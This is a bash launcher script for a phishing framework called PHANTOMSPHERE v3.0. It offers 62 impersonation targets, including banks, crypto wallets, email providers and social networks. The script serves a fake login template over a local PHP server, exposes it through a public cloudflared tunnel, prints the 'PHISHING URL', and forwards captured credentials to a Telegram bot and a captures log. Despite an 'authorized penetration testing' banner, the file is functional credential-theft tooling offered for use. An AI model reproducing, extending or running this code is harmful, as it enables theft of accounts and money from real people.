#!/bin/bash

#=============================================================#
#  PHANTOMSPHERE v3.0 — Advanced Phishing Framework            #
#  62 Platforms | Anti-Bot | Geo-IP | Telegram Alerts          #
#  Authorized Penetration Testing Tool                         #
#=============================================================#

GREEN='\033[0;32m'; RED='\033[0;31m'; BLUE='\033[0;34m'
CYAN='\033[0;36m'; YELLOW='\033[1;33m'; WHITE='\033[1;37m'; NC='\033[0m'; BOLD='\033[1m'
PWD="$(pwd)"; LOGS_DIR="$PWD/logs"; TEMPLATES_DIR="$PWD/templates"

banner() {
    clear
    echo -e "${RED}"
    echo "    ╔═══════════════════════════════════════════════╗"
    echo "    ║   ██████╗ ██╗  ██╗ █████╗ ███╗   ██╗        ║"
    echo "    ║   ██╔══██╗██║  ██║██╔══██╗████╗  ██║        ║"
    echo "    ║   ██████╔╝███████║███████║██╔██╗ ██║        ║"
    echo "    ║   ██╔═══╝ ██╔══██║██╔══██║██║╚██╗██║        ║"
    echo "    ║   ██║     ██║  ██║██║  ██║██║ ╚████║        ║"
    echo "    ║   ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝        ║"
    echo "    ║        P H A N T O M   S P H E R E           ║"
    echo "    ║     Advanced Phishing Framework v3.0         ║"
    echo "    ║     62 Platforms | Geo-IP | Live Alerts      ║"
    echo "    ╚═══════════════════════════════════════════════╝"
    echo -e "${NC}"
}

check_deps() {
    for dep in php curl jq cloudflared; do
        if ! command -v "$dep" &>/dev/null; then
            echo -e "${RED}[!] Missing: $dep${NC}"; exit 1
        fi
    done
}

select_platform() {
    echo -e "\n${CYAN}${BOLD}[ SELECT PLATFORM - 62 AVAILABLE ]${NC}\n"
    echo -e "${WHITE}  ╔═══════════════════════════════════════════════════════╗${NC}"
    echo -e "${WHITE}  ║  SOCIAL MEDIA (1-14)                                  ║${NC}"
    echo -e "${WHITE}  ║   1) Facebook    2) Instagram   3) X (Twitter)       ║${NC}"
    echo -e "${WHITE}  ║   4) LinkedIn    5) TikTok      6) Snapchat          ║${NC}"
    echo -e "${WHITE}  ║   7) Reddit      8) Discord     9) Pinterest         ║${NC}"
    echo -e "${WHITE}  ║  10) Twitch     11) Steam      12) Quora             ║${NC}"
    echo -e "${WHITE}  ║  13) Tumblr     14) Medium                           ║${NC}"
    echo -e "${WHITE}  ╠═══════════════════════════════════════════════════════╣${NC}"
    echo -e "${WHITE}  ║  MESSAGING (15-17)                                    ║${NC}"
    echo -e "${WHITE}  ║  15) Telegram   16) WhatsApp   17) Slack              ║${NC}"
    echo -e "${WHITE}  ╠═══════════════════════════════════════════════════════╣${NC}"
    echo -e "${WHITE}  ║  EMAIL / PRODUCTIVITY (18-23)                         ║${NC}"
    echo -e "${WHITE}  ║  18) Google     19) Microsoft  20) Yahoo             ║${NC}"
    echo -e "${WHITE}  ║  21) ProtonM    22) Zoho       23) Atlassian         ║${NC}"
    echo -e "${WHITE}  ╠═══════════════════════════════════════════════════════╣${NC}"
    echo -e "${WHITE}  ║  PAYMENT / FINANCIAL (24-28)                          ║${NC}"
    echo -e "${WHITE}  ║  24) PayPal     25) Cash App   26) Venmo             ║${NC}"
    echo -e "${WHITE}  ║  27) Robinhood  28) Webull                           ║${NC}"
    echo -e "${WHITE}  ╠═══════════════════════════════════════════════════════╣${NC}"
    echo -e "${WHITE}  ║  CRYPTO EXCHANGES (29-34)                             ║${NC}"
    echo -e "${WHITE}  ║  29) Binance    30) Bybit      31) Coinbase          ║${NC}"
    echo -e "${WHITE}  ║  32) Kraken     33) Gemini     34) Crypto.com        ║${NC}"
    echo -e "${WHITE}  ╠═══════════════════════════════════════════════════════╣${NC}"
    echo -e "${WHITE}  ║  CRYPTO WALLETS (35-37)                               ║${NC}"
    echo -e "${WHITE}  ║  35) Trust W.   36) MetaMask   37) Ledger            ║${NC}"
    echo -e "${WHITE}  ╠═══════════════════════════════════════════════════════╣${NC}"
    echo -e "${WHITE}  ║  BANKING (38-42)                                      ║${NC}"
    echo -e "${WHITE}  ║  38) Chase      39) Wells F.   40) BofA              ║${NC}"
    echo -e "${WHITE}  ║  41) Cap One    42) AmEx                             ║${NC}"
    echo -e "${WHITE}  ╠═══════════════════════════════════════════════════════╣${NC}"
    echo -e "${WHITE}  ║  E-COMMERCE (43-46)                                   ║${NC}"
    echo -e "${WHITE}  ║  43) Amazon     44) eBay       45) Etsy              ║${NC}"
    echo -e "${WHITE}  ║  46) Shopify                                        ║${NC}"
    echo -e "${WHITE}  ╠═══════════════════════════════════════════════════════╣${NC}"
    echo -e "${WHITE}  ║  STREAMING (47-49)                                    ║${NC}"
    echo -e "${WHITE}  ║  47) Netflix    48) Spotify    49) Hulu              ║${NC}"
    echo -e "${WHITE}  ╠═══════════════════════════════════════════════════════╣${NC}"
    echo -e "${WHITE}  ║  TECH / CLOUD (50-54)                                 ║${NC}"
    echo -e "${WHITE}  ║  50) GitHub     51) Dropbox    52) Adobe             ║${NC}"
    echo -e "${WHITE}  ║  53) WordPress  54) Apple ID                         ║${NC}"
    echo -e "${WHITE}  ╠═══════════════════════════════════════════════════════╣${NC}"
    echo -e "${WHITE}  ║  TRAVEL / SHARING (55-57)                             ║${NC}"
    echo -e "${WHITE}  ║  55) Uber       56) Airbnb     57) Lyft              ║${NC}"
    echo -e "${WHITE}  ╠═══════════════════════════════════════════════════════╣${NC}"
    echo -e "${WHITE}  ║  GAMING / DATING (58-61)                              ║${NC}"
    echo -e "${WHITE}  ║  58) Epic Games 59) PlaySt.    60) Tinder            ║${NC}"
    echo -e "${WHITE}  ║  61) Bumble     62) Custom                           ║${NC}"
    echo -e "${WHITE}  ╚═══════════════════════════════════════════════════════╝${NC}"
    echo ""
    echo -ne "${GREEN}${BOLD}[+] Select [1-62]: ${NC}"; read -r ch

         case $ch in
          1) P="Facebook";      T="facebook" ;;
          2) P="Instagram";     T="instagram" ;;
          3) P="X (Twitter)";   T="x_twitter" ;;
          4) P="LinkedIn";      T="linkedin" ;;
          5) P="TikTok";        T="tiktok" ;;
          6) P="Snapchat";      T="snapchat" ;;
          7) P="Reddit";        T="reddit" ;;
          8) P="Discord";       T="discord" ;;
          9) P="Pinterest";     T="pinterest" ;;
         10) P="Twitch";        T="twitch" ;;
         11) P="Steam";         T="steam" ;;
         12) P="Quora";         T="quora" ;;
         13) P="Tumblr";        T="tumblr" ;;
         14) P="Medium";        T="medium" ;;
         15) P="Telegram Web";  T="telegram" ;;
         16) P="WhatsApp Web";  T="whatsapp" ;;
         17) P="Slack";         T="slack" ;;
         18) P="Gmail/Google";  T="google" ;;
         19) P="Microsoft/Outlook"; T="microsoft" ;;
         20) P="Yahoo Mail";    T="yahoo" ;;
         21) P="Proton Mail";   T="protonmail" ;;
         22) P="Zoho Mail";     T="zoho" ;;
         23) P="Atlassian";     T="atlassian" ;;
         24) P="PayPal";        T="paypal" ;;
         25) P="Cash App";      T="cashapp" ;;
         26) P="Venmo";         T="venmo" ;;
         27) P="Robinhood";     T="robinhood" ;;
         28) P="Webull";        T="webull" ;;
         29) P="Binance";       T="binance" ;;
         30) P="Bybit";         T="bybit" ;;
         31) P="Coinbase";      T="coinbase" ;;
         32) P="Kraken";        T="kraken" ;;
         33) P="Gemini";        T="gemini" ;;
         34) P="Crypto.com";    T="crypto_com" ;;
         35) P="Trust Wallet";  T="trustwallet" ;;
         36) P="MetaMask";      T="metamask" ;;
         37) P="Ledger Live";   T="ledger" ;;
         38) P="Chase";         T="chase" ;;
         39) P="Wells Fargo";   T="wellsfargo" ;;
         40) P="Bank of America"; T="bankofamerica" ;;
         41) P="Capital One";   T="capitalone" ;;
         42) P="American Express"; T="amex" ;;
         43) P="Amazon";        T="amazon" ;;
         44) P="eBay";          T="ebay" ;;
         45) P="Etsy";          T="etsy" ;;
         46) P="Shopify";       T="shopify" ;;
         47) P="Netflix";       T="netflix" ;;
         48) P="Spotify";       T="spotify" ;;
         49) P="Hulu";          T="hulu" ;;
         50) P="GitHub";        T="github" ;;
         51) P="Dropbox";       T="dropbox" ;;
         52) P="Adobe";         T="adobe" ;;
         53) P="WordPress";     T="wordpress" ;;
         54) P="Apple ID";      T="apple" ;;
         55) P="Uber";          T="uber" ;;
         56) P="Airbnb";        T="airbnb" ;;
         57) P="Lyft";          T="lyft" ;;
         58) P="Epic Games";    T="epicgames" ;;
         59) P="PlayStation";   T="playstation" ;;
         60) P="Tinder";        T="tinder" ;;
         61) P="Bumble";        T="bumble" ;;
         62) P="Custom";        T="custom" ;;
          *) echo -e "${RED}[!] Invalid${NC}"; exit 1 ;;
    esac
    PLATFORM="$P"; TEMPLATE="$T"
    echo -e "${GREEN}[+] Selected: $PLATFORM${NC}"
}

cfg_alerts() {
    echo -e "\n${CYAN}${BOLD}[ ALERT CONFIG ]${NC}\n"
    echo -e "${WHITE}  1) Telegram Bot (live push alerts)${NC}"
    echo -e "${WHITE}  2) Local terminal only${NC}"
    echo -ne "${GREEN}[+] Select [1-2]: ${NC}"; read -r ac
    if [ "$ac" == "1" ]; then
        echo -e "${YELLOW}  Get token from @BotFather on Telegram${NC}"
        echo -ne "${GREEN}[+] Bot Token: ${NC}"; read -r bt
        echo -ne "${GREEN}[+] Chat ID: ${NC}"; read -r ci
        echo "{\"bot_token\":\"$bt\",\"chat_id\":\"$ci\"}" > "$PWD/config/telegram.json"
        echo -e "${GREEN}[+] Telegram configured!${NC}"
    fi
}

start_svc() {
    PORT=$((RANDOM % 5000 + 10000))
    echo -e "\n${CYAN}[+] PHP server on port $PORT...${NC}"
    php -S 0.0.0.0:"$PORT" -t "$TEMPLATES_DIR/$TEMPLATE" > /dev/null 2>&1 &
    PHP_PID=$!

    echo -e "${CYAN}[+] Cloudflared tunnel...${NC}"
    cloudflared tunnel --url http://localhost:"$PORT" > /tmp/cflog.txt 2>&1 &
    CF_PID=$!
    sleep 4

    TUNNEL_URL=$(grep -o 'https://[a-zA-Z0-9.-]*\.trycloudflare.com' /tmp/cflog.txt | head -1)
    if [ -z "$TUNNEL_URL" ]; then sleep 3; TUNNEL_URL=$(grep -o 'https://[a-zA-Z0-9.-]*\.trycloudflare.com' /tmp/cflog.txt | head -1); fi

    echo -e "\n${GREEN}${BOLD}═══════════════════════════════════════════════${NC}"
    echo -e "${GREEN}${BOLD}  PHISHING URL:${NC}"
    echo -e "${YELLOW}${BOLD}  $TUNNEL_URL${NC}"
    echo -e "${GREEN}${BOLD}═══════════════════════════════════════════════${NC}"
    echo -e "\n${WHITE}  Watch captures: tail -f $LOGS_DIR/captures.log${NC}"
    echo -e "${WHITE}  Ctrl+C to stop${NC}\n"
}

cleanup() {
    echo -e "\n${YELLOW}[!] Stopping...${NC}"
    kill $PHP_PID 2>/dev/null; kill $CF_PID 2>/dev/null
    echo -e "${GREEN}[+] Done.${NC}"; exit 0
}
trap cleanup SIGINT SIGTERM

# ---- MAIN ----
banner; check_deps
if [ ! -d "$TEMPLATES_DIR/facebook" ]; then
    echo -e "${CYAN}[+] First run — generating 62 templates...${NC}"
    bash "$PWD/modules/gen62.sh"
fi
select_platform; cfg_alerts; start_svc
while true; do
    [ -f "$LOGS_DIR/captures.log" ] && tail -f "$LOGS_DIR/captures.log" 2>/dev/null
    sleep 1
done
